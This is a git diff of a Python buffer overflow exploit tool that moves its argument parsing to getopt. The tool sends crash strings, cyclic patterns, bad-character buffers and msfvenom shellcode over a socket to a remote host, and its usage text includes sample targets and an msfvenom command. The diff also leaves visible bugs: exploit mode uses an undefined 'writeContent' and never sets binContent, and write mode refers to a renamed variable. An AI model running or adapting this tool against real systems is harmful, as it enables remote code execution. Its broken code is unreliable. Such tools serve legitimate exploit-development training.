@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #
-# ig_buffer_overflow.py
+# ig-buffer-overflow.py
 #
 # Isabelle's generic buffer overflow tool
 #
@@ -8,60 +8,57 @@
 import sys
 import socket
 import binascii
+import getopt
 
 VERBOSE = True
 
 # Script usage
-def printUsage(scriptName):
+def print_usage(scriptName):
 	print("Usages:")
 	print("")
 	print("test - Sends simple string (AAAAA) with buffer size and buffer head for memory test")
-	print(" {} test remoteHost remotePort buffSize buffHead".format(scriptName))
-	print(" {} test 10.2.31.155 2050 4096 'cmd2 /.:/'".format(scriptName))
+	print(" {} -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
 	print("")
 
 	print("cyclic - Sends cyclic string to help identify memory positions")
-	print(" {} cyclic remoteHost remotePort buffSize buffHead".format(scriptName))
-	print(" {} cyclic 10.2.31.155 2050 4096 'cmd2 /.:/'".format(scriptName))
+	print(" {} -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
 	print("")
 
 	print("write - Writes hex value to buffer offset")
-	print(" {} write remoteHost remotePort buffSize buffHead offset hexcontent".format(scriptName))
-	print(" {} write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 0A62F809".format(scriptName))
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809".format(scriptName))
 	print("")
 
 	print("write - Write badchars (before or after offset content) for badchar verification")
-	print(" {} write remoteHost remotePort buffSize buffHead offset hexcontent badAfter excludeChars".format(scriptName))
-	print(" {} write remoteHost remotePort buffSize buffHead offset hexcontent badBefore reverseJmpSize excludeChars".format(scriptName))
-	print(" Example: Vanilla Buffer Overflow: {} write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 0A62F809 badAfter '000a'".format(scriptName))
-	print(" Example: SEH Overwrite: {} write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 0A62F809 badBefore 800 '00'".format(scriptName))
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=after --exclude=000a".format(scriptName))
+	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=before --exclude=000a --reversejmp=800".format(scriptName))
 	print("")
 
 	print("exploit - Sends malicious payload via buffer overflow")
-	print(" {} exploit remoteHost remotePort buffSize buffHead offset hexcontent reverseJmpSize shellCodeFile [nops]".format(scriptName))
-	print(" {} exploit 10.2.31.155 2048 5009 hello 01010101 1203 10 payload".format(scriptName))
+	print(" {} -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=payload --nops=10".format(scriptName))
 	print("")
 
 	print("Parameters:")
 	print("")
-	print(" [mode]		: Script modes: test|cyclic|write|exploit")
-	print(" remoteHost	: Remote host IP.")
-	print(" remotePort	: Remote host port.")
-	print(" buffSize	: Amount of variable bytes to send.")
-	print(" buffHead	: Static buffer string set at the beginning of the buffer.")
+	print(" -h|--help	: Show script usage.")
+	print(" -n|--norec	: Don't wait for receive message after connect.")
+	print(" -m|--mode	: Select script mode (test|cyclic|write|exploit).")
+	print(" --rhost		: Remote host IP.")
+	print(" --rport		: Remote host port.")
+	print(" --buffsize	: Amount of variable bytes to send.")
+	print(" --buffhead	: Static buffer string set at the beginning of the buffer.")
 	print("		 Is usually the crash string. Size is considered in buffSize calc.")
-	print(" offset		: Place in buffer where content can be added.")
-	print(" hexcontent	: Hex string to add at the offset position.")
+	print(" --offset	: Place in buffer where content can be added.")
+	print(" --hexcontent	: Hex string to add at the offset position.")
 	print("		Can be considered as big endian (default) or little endian (will be reversed).")
 	print("		Use 'g' or 'l' to delimit the order. Examples:")
 	print("		'g01020304l05060708' --> will send '0102030408070605'")
 	print("		'01020304' --> will send '01020304'")
-	print(" bad*		: Adds bad chars before [badBefore] or after [badAfter] the content. Used for bad char testing.")
-	print(" excludeChars	: List of chars (formatted as hex string) to be excluded from badchar list.")
-	print(" reverseJmpSize	: Size in bytes to jump before the content to inject bad chars or the shell code.")
-	print(" shellCodeFile	: Python shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.")
-	print("		Example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o shellCodeFile")
-	print(" nops		: Amount of nops to add before and after the shell code. Default is 0.")
+	print(" --badchar	: Adds bad chars before (before) or after (after) the content. Used for bad char testing.")
+	print(" --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.")
+	print(" --reversejmp	: Size in bytes to jump before the content to inject bad chars or the shell code.")
+	print(" --shellcode	: Python shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.")
+	print("		Example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o payload")
+	print(" --nops		: Amount of nops to add before and after the shell code. Default is 0.")
 
 
 # Auxiliary functions ###################################################################
@@ -303,40 +300,86 @@ if __name__ == "__main__":
 	DEFAULT_SOCKET_BUFF_SIZE = 1024
 	scriptName = sys.argv[0]
 
-	if (len(sys.argv) < 5) :
-		printUsage(scriptName)
-		sys.exit(1)	
-
 	# Avaiable modes
-	AVAILABLE_MODES = ['test', 'cyclic', 'write', 'exploit']
-	mode = sys.argv[1]
+	AVAILABLE_MODES = ["test", "cyclic", "write", "exploit"]
 
-	if mode not in AVAILABLE_MODES:
-		print("Error: incorrect mode selected")
-		printUsage(scriptName)
+	# Input parameters
+	try:
+		opts, args = getopt.getopt(sys.argv[1:], "hnm:", ["help", "norec", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "badchar=", "exclude=", "reversejmp=", "shellcode=", "nops="])
+	except getopt.GetoptError as err:
+		# print help information and exit:
+		print("Error:", err)  # will print something like "option -a not recognized"
+		print_usage(scriptName)
+		sys.exit(1)	
+	
+	# Default values
+	norec = False
+	mode = ""
+	rhost = ""
+	rport = 0
+	buffSizeParam = 0
+	buffHead = b''
+	offset = 0
+	hexContent = ""
+	badCharOption = ""
+	badCharExcluded = ""
+	reverseJmpSize = 0
+	shellCodeFile = ""
+	nops = 0
+
+	# Verify options
+	for opt, value in opts:
+		if opt in ("-h", "--help"):
+			print_usage(scriptName)
+			sys.exit(1)	
+		elif opt in ("-n", "--norec"):
+			norec = True
+		elif opt in ("-m", "--mode"):
+			mode = value
+			if mode not in AVAILABLE_MODES:
+				print("Error: unknown mode.")
+				print_usage(scriptName)
+				sys.exit(1);
+		elif opt == '--rhost':
+			rhost = value
+		elif opt == '--rport':
+			rport = int(value)
+		elif opt == '--buffhead':
+			buffHead = str.encode(value)
+		elif opt == '--buffsize':
+			buffSizeParam = int(value)
+		elif opt == '--offset':
+			offset = int(value)
+		elif opt == '--hexcontent':
+			hexContent = value
+		elif opt == '--badchar':
+			badCharOption = value
+		elif opt == '--exclude':
+			badCharExcluded = value
+		elif opt == '--reversejmp':
+			reverseJmpSize = int(value)
+		elif opt == '--shellcode':
+			shellCodeFile = value
+		elif opt == '--nops':
+			nops = int(value)
+		else:
+			print("Error: Unknown parameter")
+			print_usage(scriptName)
+			sys.exit(1)
+
+
+	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | badchar={} | exclude={} | reversejmp={} | shellcode={} | nops={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, badCharOption, badCharExcluded, reverseJmpSize, shellCodeFile, nops)) if VERBOSE else None
+
+	if not mode or not rhost or not rport or not buffSizeParam:
+		print("Error: incorrect minimum number of params.")
+		print_usage(scriptName)
 		sys.exit(1);
 
-	# Check mode params
-	if mode == 'write' and len(sys.argv) < 8:
-		print("Error: incorrect number of params")
-		printUsage(scriptName)
-		sys.exit(1);
-
-	if mode == 'exploit' and len(sys.argv) != 11:
-		print("Error: incorrect number of params")	
-		printUsage(scriptName)
-		sys.exit(1);
-
-	#print("Script arguments: ", sys.argv) if VERBOSE else None
-
-	# Set input parameteres
-	rhost = sys.argv[2]
-	rport = int(sys.argv[3])
-	buffHead = str.encode(sys.argv[5])
-	buffSize = int(sys.argv[4]) - len(buffHead)
+	buffSize = buffSizeParam - len(buffHead)
 
 	# Verify mode and create payload
 	buffPayload = ""
+
 	if mode == 'test':
 		buffPayload = create_test_payload(buffHead, buffSize)
 
@@ -344,47 +387,32 @@ if __name__ == "__main__":
 		buffPayload = create_cyclic_payload(buffHead, buffSize)
 
 	elif mode == 'write':
-		offset = int(sys.argv[6])
-		writeContent = sys.argv[7]
-		binContent = get_binary_content(writeContent)
+		if not hexContent:
+			print("Error: incorrect number of params for --mode=write.")
+			sys.exit(1);
 
-		if len(sys.argv) > 8:
-			badCharOption = sys.argv[8]
+		binContent = get_binary_content(hexContent)
 
-			if badCharOption == 'badBefore':
-				if (len(sys.argv) <= 9):
-					print("Error: incorrect number of params.")
-					sys.exit(1);
-
-				reverseJmpSize = int(sys.argv[9])
-				excludedChars = sys.argv[10] if len(sys.argv) > 10 else ""
-
-				buffPayload = create_badchar_payload_before(buffHead, buffSize, offset, binContent, reverseJmpSize, excludedChars)
-
-			elif badCharOption == 'badAfter':
-				excludedChars = sys.argv[9] if len(sys.argv) > 9 else ""
-
-				buffPayload = create_badchar_payload_after(buffHead, buffSize, offset, binContent, excludedChars)
-				
-			else:
-				print("Error: incorrect badchar option. Can only be 'badBefore' or 'badAfter'")
+		if badCharOption == 'before':
+			if not reverseJmpSize:
+				print("Error: incorrect number of params for --mode=write, --badchar=before.")
 				sys.exit(1);
+
+			buffPayload = create_badchar_payload_before(buffHead, buffSize, offset, binContent, reverseJmpSize, excludedChars)
+
+		elif badCharOption == 'after':
+			buffPayload = create_badchar_payload_after(buffHead, buffSize, offset, binContent, excludedChars)
+			
 		else:
 			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)
 
-
 	elif mode == 'exploit':
-		offset = int(sys.argv[6])
-		writeContent = sys.argv[7]
-		binContent = get_binary_content(writeContent)
-
-		reverseJmpSize = int(sys.argv[8])
-		shellCodeFile = sys.argv[9]
-		nops = int(sys.argv[10]) if len(sys.argv) > 10 else 0
+		get_binary_content(writeContent)
 
 		buffPayload = create_exploit_payload(buffHead, buffSize, offset, binContent, reverseJmpSize, shellCodeFile, nops)
 	else:
-		printUsage(scriptName)
+		print("Error: incorrect number of params.")
+		print_usage(scriptName)
 		sys.exit(1);
 
 
@@ -400,8 +428,9 @@ if __name__ == "__main__":
 		print("Started socket communication") if VERBOSE else None
 
 		# Application connection return
-		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
-		print(r) if VERBOSE else None
+		if not norec:
+			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
+			print(r) if VERBOSE else None
 
 		# Send payload
 		print("") if VERBOSE else None
@@ -418,9 +447,9 @@ if __name__ == "__main__":
 		print(r) if VERBOSE else None
 
 	except KeyboardInterrupt:
-		print("Keyboard Interrupt. Exiting.")
+		print("Exit: Keyboard Interrupt")
 	except:
-		print("Unexpected error:", sys.exc_info()[0])
+		print("Error: Unexpected error.", sys.exc_info()[0])
 		raise
 	finally:
 		s.close()
